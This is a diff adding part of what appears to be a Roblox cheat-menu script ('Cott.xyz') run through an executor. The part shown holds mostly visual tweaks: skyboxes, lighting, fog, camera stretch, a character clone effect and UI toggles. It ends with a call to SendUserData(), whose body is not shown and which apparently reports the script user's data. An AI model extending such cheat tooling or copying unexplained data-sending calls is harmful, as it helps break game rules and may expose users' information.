+        ["SkyboxBk"] = "rbxassetid://570555736",
+        ["SkyboxDn"] = "rbxassetid://570555964",
+        ["SkyboxFt"] = "rbxassetid://570555800",
+        ["SkyboxLf"] = "rbxassetid://570555840",
+        ["SkyboxRt"] = "rbxassetid://570555882",
+        ["SkyboxUp"] = "rbxassetid://570555929"
+    },
+    ["Purple Faded"] = {
+        ["SkyboxBk"] = "rbxassetid://8107841671",
+        ["SkyboxDn"] = "rbxassetid://6444884785",
+        ["SkyboxFt"] = "rbxassetid://8107841671",
+        ["SkyboxLf"] = "rbxassetid://8107841671",
+        ["SkyboxRt"] = "rbxassetid://8107841671",
+        ["SkyboxUp"] = "rbxassetid://8107849791"
+    }
+}
+
+Menu.ComboBox("Visuals", "World Settings", "Skyboxes", "Select One", {"Purple Nebula", "Nebula", "Night Sky", "Pink Daylight", "Morning Glow", "Setting Sun", "Fade Blue", "Elegant Morning", "Neptune", "Aesthetic Night", "HL Last Coast", "Floppa", "Kanye West", "Purple And Blue", "Twighlight", "Faded Morning", "Strong Red", "Purple Faded"}, function(x)
+    if game.Lighting:FindFirstChildOfClass("Sky") then 
+        game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
+    end
+    local skybox = Instance.new("Sky", game.Lighting)
+    skybox.SkyboxLf = Skyboxes[x].SkyboxLf
+    skybox.SkyboxBk = Skyboxes[x].SkyboxBk
+    skybox.SkyboxDn = Skyboxes[x].SkyboxDn
+    skybox.SkyboxFt = Skyboxes[x].SkyboxFt
+    skybox.SkyboxRt = Skyboxes[x].SkyboxRt
+    skybox.SkyboxUp = Skyboxes[x].SkyboxUp
+    skybox.Name = "override"
+end)
+
+Menu.Button('Visuals', 'World Settings', 'Remove Skybox', function()
+    if game.Lighting:FindFirstChildOfClass("Sky") then 
+        game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
+    end
+end)
+
+Menu.CheckBox("Visuals", "World Settings", "Bullet", false, function(a)
+    RevBullet = a
+end)
+
+Menu.ColorPicker("Visuals", "World Settings", "Bullet Color", AccentColor, 0, function(color)
+    task.spawn(function()
+        while task.wait() do
+            if RevBullet then
+                game:GetService("ReplicatedStorage")["Revolver Bullet"].Color = color
+            else
+                game:GetService("ReplicatedStorage")["Revolver Bullet"].Color = Color3.fromRGB(248, 217, 109)
+            end
+        end
+    end)
+end)
+
+Menu.CheckBox("Visuals", "World Settings", "Ambient", false, function(a)
+    ambient = a
+end)
+
+Menu.ColorPicker("Visuals", "World Settings", "Ambient Color", Color3.fromRGB(138, 138, 138), 0, function(color)
+    task.spawn(function()
+        while task.wait() do
+            if ambient then
+                game:GetService("Lighting").Ambient = color
+            else
+                game:GetService("Lighting").Ambient = Color3.fromRGB(138, 138, 138)
+            end
+        end
+    end)
+end)
+
+Menu.CheckBox("Visuals", "World Settings", "OutDoor Ambient", false, function(a)
+    ODAmbient = a
+end)
+
+Menu.ColorPicker("Visuals", "World Settings", "OutDoor Ambient Color", Color3.fromRGB(128,128,128), 0, function(color)
+    task.spawn(function()
+        while task.wait() do
+            if ODAmbient then
+                game:GetService("Lighting").OutdoorAmbient = color
+            else
+                game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(138, 138, 138)
+            end
+        end
+    end)
+end)
+
+Menu.CheckBox("Visuals", "World Settings", "Fog", false, function(a)
+    Fog = a
+end)
+
+Menu.ColorPicker("Visuals", "World Settings", "Fog Color", Color3.fromRGB(165, 224, 255), 0, function(color)
+    task.spawn(function()
+        while task.wait() do
+            if Fog then
+                game:GetService("Lighting").FogColor = color
+            else
+                game:GetService("Lighting").FogColor = Color3.fromRGB(165, 224, 255)
+            end
+        end
+    end)
+end)
+
+Menu.Slider('Visuals', 'World Settings', 'Fog End', 0, 10000, 4000, '', 2, function(a)
+    game:GetService("Lighting").FogEnd = a
+end)
+
+Menu.Slider('Visuals', 'World Settings', 'Brightness', 1, 5, 2, '', 1, function(x)
+    game:GetService("Lighting").Brightness = x
+end)
+
+Menu.Slider('Visuals', 'World Settings', 'Environment Diffuse Scale', 0, 1, 0, '', 2, function(x)
+    game:GetService("Lighting").EnvironmentDiffuseScale = x
+end)
+
+Menu.Slider('Visuals', 'World Settings', 'Time', 1, 24, 14, '', 2, function(x)
+    game:GetService("Lighting").ClockTime = x
+end)
+
+Menu.Container("Visuals", "Camera", "Right")
+
+Menu.Slider('Visuals', 'Camera', 'Fov', 70, 120, 70, '', 2, function(x)
+    workspace.CurrentCamera.FieldOfView = x
+end)
+
+Menu.Slider('Visuals', 'Camera', 'Stretch', 0, 1, 1, '', 2, function(box)
+    getgenv().Resolution = {
+        [".gg/scripters"] = box
+    }
+    
+    local Camera = workspace.CurrentCamera
+    if getgenv().gg_scripters == nil then
+        game:GetService("RunService").RenderStepped:Connect(
+            function()
+                Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, getgenv().Resolution[".gg/scripters"], 0, 0, 0, 1)
+            end
+        )
+    end
+    getgenv().gg_scripters = "Aori0001"
+end)
+
+Menu.Container("Visuals", "UI", "Left")
+
+Menu.CheckBox("Visuals", "UI", "Spriting", false, function(x)
+    sprint = x
+end)
+
+Menu.ColorPicker("Visuals", "UI", "Sprinting Color", AccentColor, 0, function(color)
+    task.spawn(function()
+        while task.wait() do
+            if sprint then
+                game:GetService("Players").LocalPlayer.PlayerGui.Sprinting.Frame.Frame.BackgroundColor3 = color
+            else
+                game:GetService("Players").LocalPlayer.PlayerGui.Sprinting.Frame.Frame.BackgroundColor3 = Color3.fromRGB(56, 186, 255)
+            end
+        end
+    end)
+end)
+
+Menu.CheckBox("Visuals", "UI", "Remove Event UI", false, function(v)
+    getgenv().HideEventMenu = v
+    while true do
+        if not getgenv().HideEventMenu then return end
+        wait(3)
+        if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Event!") then
+            game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Event!"):Remove()
+        end
+    end
+end)
+
+Menu.CheckBox("Visuals", "UI", "Remove Emote UI", false, function(v)
+    getgenv().HideEmotesMenu = v
+    while true do
+        if not getgenv().HideEmotesMenu then return end
+        wait(3)
+        if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Emotes") then
+            game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Emotes"):Remove()
+        end
+    end
+end)
+
+Menu.Container("Visuals", "Self", "Right")
+
+local Eclipse_Settins = {
+    miscs = {
+        clone = {
+            toggle = false,
+            timedestroy = 1,
+            matreial = "Neon",
+            color = Color3.fromRGB(255,255,255),
+            Transpancy = 0
+        },
+    }
+}
+
+local Eclipse_Folder = Instance.new("Folder", workspace)
+
+Eclipse_Folder.Name = "x"
+Eclipse_Folder.Parent = game.Workspace
+
+Menu.CheckBox("Visuals", "Self", "Clone", false, function(x)
+    Eclipse_Settins.miscs.clone.toggle = x
+    if  Eclipse_Settins.miscs.clone.toggle then
+        repeat
+            game.Players.LocalPlayer.Character.Archivable = true
+            local Clone = game.Players.LocalPlayer.Character:Clone()
+            for _,clone in next, Clone:GetDescendants() do
+                if clone.Name == "HumanoidRootPart" or clone:IsA("Humanoid") or clone:IsA("LocalScript") or clone:IsA("Script") or clone:IsA("Decal") then
+                    clone:Destroy()
+                elseif clone:IsA("BasePart") or clone:IsA("Meshpart") or clone:IsA("Part")   then
+                    if clone.Transparency == 1 then
+                        clone:Destroy()
+                    else
+                        clone.CanCollide = false
+                        clone.Anchored = true
+                        clone.Material = Eclipse_Settins.miscs.clone.matreial
+                        clone.Color = Eclipse_Settins.miscs.clone.color
+                        clone.Transparency = Eclipse_Settins.miscs.clone.Transpancy
+                        clone.Size = clone.Size + Vector3.new(0.03, 0.03, 0.03)   
+                    end
+                end
+                pcall(function()
+                    clone.CanCollide = false
+                end)
+            end
+            Clone.Parent = Eclipse_Folder
+            wait(Eclipse_Settins.miscs.clone.timedestroy)
+            Clone:Destroy()
+        until Eclipse_Settins.miscs.clone.toggle == false
+    end
+end)
+
+Menu.ColorPicker("Visuals", "Self", "Clone Color", AccentColor, 0, function(Clone_Color)
+    Eclipse_Settins.miscs.clone.color = Clone_Color
+end)
+
+Menu.Slider('Visuals', 'Self', 'Clone Duration', 0, 1, 0.5, '', 2, function(a)
+    Eclipse_Settins.miscs.clone.timedestroy = a
+end)
+
+Menu.Slider('Visuals', 'Self', 'Clone Transpancy', 0, 1, 0, '', 2, function(a)
+    Eclipse_Settins.miscs.clone.Transpancy = a
+end)
+
+Menu.ComboBox("Visuals", "Self", "Clone Material", "Select One", {"Neon", "Glass","ForceField"}, function(x)
+    Eclipse_Settins.miscs.clone.matreial = x
+end)
+
+Eclipse_Settins.miscs.clone.Transpancy = Value
+
+local MainTab = Menu.Tab("Config")
+
+Menu.Container("Config", "Menu", "Left")
+
+local MBind = 
+
+Menu.Hotkey('Config', 'Menu', 'Toggle UI', MBind, function(New)
+    local UserInputService = game:GetService("UserInputService")
+    local toggleState = false
+    local toggleKey = New
+
+    local function onKeyPress(input, gameProcessed)
+        if gameProcessed then return end
+
+        if input.KeyCode == toggleKey then
+            toggleState = not toggleState
+            if toggleState then
+                Menu:SetVisible(true)
+            else
+                Menu:SetVisible(false)
+            end
+        end
+    end
+
+    UserInputService.InputBegan:Connect(onKeyPress)
+end)
+
+Menu.Button('Config', 'Menu', 'Rejoin', function()
+    local ts = game:GetService("TeleportService")
+    local p = game:GetService("Players").LocalPlayer     
+    ts:Teleport(game.PlaceId, p)
+end)
+
+Linotify:Notify("Welcome "..game.Players.LocalPlayer.DisplayName.." To [Cott.xyz]", 1.6)
+SendUserData()
